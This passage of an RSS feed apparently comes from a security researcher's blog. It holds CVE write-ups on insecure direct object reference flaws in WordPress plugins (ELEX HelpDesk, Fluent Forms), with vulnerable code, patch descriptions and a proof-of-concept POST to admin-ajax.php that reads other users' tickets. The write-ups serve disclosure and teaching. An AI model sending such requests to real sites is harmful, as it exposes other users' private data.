{&#xA;&#x9;&#x9;$retrived[ $data[ $i ][&amp;#39;meta_key&amp;#39;] ] = maybe_unserialize( $data[ $i ][&amp;#39;meta_value&amp;#39;] );&#xA;&#x9;}&#xA;&#x9;return maybe_unserialize( $retrived );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;There is no validation to ensure the current user is the ticket owner or has permission to view the ticket → IDOR&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;Patch v3.3.0&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/diff.png&#34; title=&#34;Patch v3.3.0&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Patch v3.3.0&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/diff.png&#39; alt=&#34;Patch&#34; height=&#34;693&#34; width=&#34;1888&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch v3.3.0&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The patch &lt;strong&gt;prevents IDOR by enforcing user-based access control&lt;/strong&gt;, specifically:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Comparing &lt;code&gt;ticket_author&lt;/code&gt; with &lt;code&gt;current_user_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Allowing access only for authorized roles (&lt;code&gt;administrator&lt;/code&gt;, &lt;code&gt;WSDesk_Agents&lt;/code&gt;, &lt;code&gt;WSDesk_Supervisor&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;li&gt;Rejecting unauthorized requests before returning data&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;As a result, tickets cannot be accessed by modifying &lt;code&gt;ticket_id&lt;/code&gt; alone.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated User (Subscriber&amp;#43;)&amp;#34;] &#xA;--&amp;gt; B[&amp;#34;Request admin-ajax.php?action=eh_crm_ticket_single_view_client&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Verify nonce&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Get ticket_id from request&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Load ticket by ticket_id&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;No ownership check&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;No role validation&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;Return full ticket data&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;User can view other users&amp;#39; tickets (IDOR)&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Log in as a Subscriber+ user:&lt;/li&gt;&#xA;&lt;li&gt;Submit any ticket&lt;/li&gt;&#xA;&lt;li&gt;In the &lt;code&gt;Your Tickets&lt;/code&gt; table, obtain the &lt;code&gt;nonce&lt;/code&gt; by viewing the page source:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/nonce.png&#34; title=&#34;Nonce&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Nonce&lt;/h2&gt;&lt;p&gt;Nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;513&#34; width=&#34;1346&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;Send the following request using the obtained &lt;code&gt;nonce&lt;/code&gt;:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;Cookie: Subscriber&amp;#43; cookie&#xA;&#xA;action=eh_crm_ticket_single_view_client&amp;amp;nonce=4de88a7186&amp;amp;ticket_id=any_ticket_id &lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-28-cve-2025-10039/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2025-12-28-cve-2025-10039/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-28-cve-2025-10039/result.png&#39; alt=&#34;Result&#34; height=&#34;910&#34; width=&#34;1555&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;The response contains the ticket content and the ticket author&amp;rsquo;s information.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The vulnerability exists because the &lt;code&gt;eh_crm_ticket_single_view_client&lt;/code&gt; endpoint &lt;strong&gt;does not verify ticket ownership&lt;/strong&gt;, relying solely on the user-supplied &lt;code&gt;ticket_id&lt;/code&gt;.&#xA;This allows any authenticated user to access other users’ tickets → &lt;strong&gt;IDOR&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The patch mitigates the issue by:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Comparing &lt;code&gt;ticket_author&lt;/code&gt; with &lt;code&gt;current_user_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Allowing access only for authorized roles&lt;/li&gt;&#xA;&lt;li&gt;Rejecting unauthorized requests before returning data&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;nonce&lt;/code&gt; &lt;strong&gt;does not replace authorization checks&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;Never trust client-supplied identifiers&lt;/li&gt;&#xA;&lt;li&gt;Always validate &lt;strong&gt;ownership&lt;/strong&gt; before accessing resources&lt;/li&gt;&#xA;&lt;li&gt;Authorization must be enforced server-side before returning responses&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/idor.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;IDOR&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/elex-helpdesk-customer-support-ticket-system/vulnerability/wordpress-elex-wordpress-helpdesk-customer-support-ticket-system-plugin-3-2-9-authenticated-subscriber-insecure-direct-object-reference-via-eh-crm-ticket-single-view-client-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ELEX WordPress HelpDesk &amp;amp; Customer Ticketing System Plugin &amp;lt;= 3.2.9 is vulnerable to Insecure Direct Object References (IDOR)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-13748 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-27-cve-2025-13748/</link>
      <pubDate>Sat, 27 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-27-cve-2025-13748/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-27-cve-2025-13748/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin &lt;strong&gt;Fluent Forms – Customizable Contact Forms, Survey, Quiz, &amp;amp; Conversational Form Builder&lt;/strong&gt; contains an &lt;strong&gt;Insecure Direct Object Reference (IDOR)&lt;/strong&gt; vulnerability in all versions &lt;strong&gt;≤ 6.1.7&lt;/strong&gt; via the &lt;code&gt;submission_id&lt;/code&gt; parameter in the SCA payment confirmation endpoint.&#xA;The vulnerability allows &lt;strong&gt;unauthenticated users&lt;/strong&gt; to &lt;strong&gt;mark other users&amp;rsquo; submissions as failed&lt;/strong&gt;, disrupting the payment process.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-13748&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-13748&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 6.1.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 6.1.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (6.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/fluentform/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress FluentForm Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;FluentForm&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;6.1.7&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;6.1.8&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The plugin registers an AJAX handler &lt;strong&gt;for unauthenticated users&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_action(&amp;#39;wp_ajax_nopriv_fluentform_sca_inline_confirm_payment&amp;#39;, [$this, &amp;#39;confirmScaPayment&amp;#39;]);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;wp_ajax_nopriv_&lt;/code&gt; is a hook for unauthenticated users. When a request is sent to the endpoint &lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt; with the parameter &lt;code&gt;action=fluentform_sca_inline_confirm_payment&lt;/code&gt;, the callback &lt;code&gt;confirmScaPayment&lt;/code&gt; is executed:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function confirmScaPayment()&#xA;{&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $formId = isset($_REQUEST[&amp;#39;form_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;form_id&amp;#39;]) : 0;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $submissionId = isset($_REQUEST[&amp;#39;submission_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;submission_id&amp;#39;]) : 0;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $paymentMethod = isset($_REQUEST[&amp;#39;payment_method&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;payment_method&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;    // phpcs:ignore WordPress.Security.NonceVerification.Recommended -- Nonce verified by Stripe webhook signature&#xA;    $paymentIntentId = isset($_REQUEST[&amp;#39;payment_intent_id&amp;#39;]) ? sanitize_text_field(wp_unslash($_REQUEST[&amp;#39;payment_intent_id&amp;#39;])) : &amp;#39;&amp;#39;;&#xA;&#xA;    $this-&amp;gt;setSubmissionId($submissionId);&#xA;    $submission = $this-&amp;gt;getSubmission();&#xA;    $this-&amp;gt;form = $this-&amp;gt;getForm();&#xA;&#xA;    $transaction = $this-&amp;gt;getLastTransaction($submissionId);&#xA;&#xA;    $confirmation = SCA::confirmPayment($paymentIntentId, [&#xA;        &amp;#39;payment_method&amp;#39; =&amp;gt; $paymentMethod&#xA;    ], $formId);&#xA;&#xA;    if (is_wp_error($confirmation)) {&#xA;        $message = &amp;#39;Payment has been failed. &amp;#39; . $confirmation-&amp;gt;get_error_message();&#xA;        $this-&amp;gt;handlePaymentChargeError($message, $submission, $transaction, $confirmation, &amp;#39;payment_error&amp;#39;);&#xA;    }&#xA;&#xA;    if ($confirmation-&amp;gt;status == &amp;#39;succeeded&amp;#39;) {&#xA;        $charge = $confirmation-&amp;gt;charges-&amp;gt;data[0];;&#xA;        $this-&amp;gt;handlePaymentSuccess($charge, $transaction, $submission);&#xA;    } else {&#xA;        $this-&amp;gt;handlePaymentChargeError(&amp;#39;We could not verify your payment. Please try again&amp;#39;, $submission, $transaction, $confirmation, &amp;#39;payment_error&amp;#39;);&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Inside &lt;code&gt;confirmScaPayment()&lt;/code&gt;, the plugin retrieves &lt;code&gt;submission_id&lt;/code&gt; directly from the request:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$submissionId = isset($_REQUEST[&amp;#39;submission_id&amp;#39;]) ? intval($_REQUEST[&amp;#39;submission_id&amp;#39;]) : 0;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This value:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Is not bound to the current user&lt;/li&gt;&#xA;&lt;li&gt;Has no ownership validation&lt;/li&gt;&#xA;&lt;li&gt;Is not checked for relationship with &lt;code&gt;form_id&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Meaning: anyone can send a request and reference any existing submission ID in the database.&lt;/p&gt;&#xA;&lt;p&gt;After retrieving &lt;code&gt;submission_id&lt;/code&gt;, the system continues:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$this-&amp;gt;setSubmissionId($submissionId);&#xA;$submission = $this-&amp;gt;getSubmission();&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;details admonition bug open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-bug&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;This is where the core IDOR occurs: the object (submission) is accessed directly using a user-controlled ID, without any access control.&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;There is no logic such as:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($submission-&amp;gt;user_id !== get_current_user_id()) {&#xA;    deny_access();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Or:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ($submission-&amp;gt;form_id !== $formId) {&#xA;    deny_access();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This allows submissions belonging to other users to be manipulated by unauthenticated attackers.&lt;/p&gt;&#xA;&lt;p&gt;In the patched version, the entire request must pass strict validation:&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-12-27-cve-2025-13748/patch.png&#34; title=&#34;Patch&#34; data-thumbnail=&#34;/posts/2025-12-27-cve-2025-13748/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-12-27-cve-2025-13748/patch.png&#39; alt=&#34;Patch&#34; height=&#34;447&#34; width=&#34;1875&#34;&gt;&lt;/a&gt;&lt;figcaption 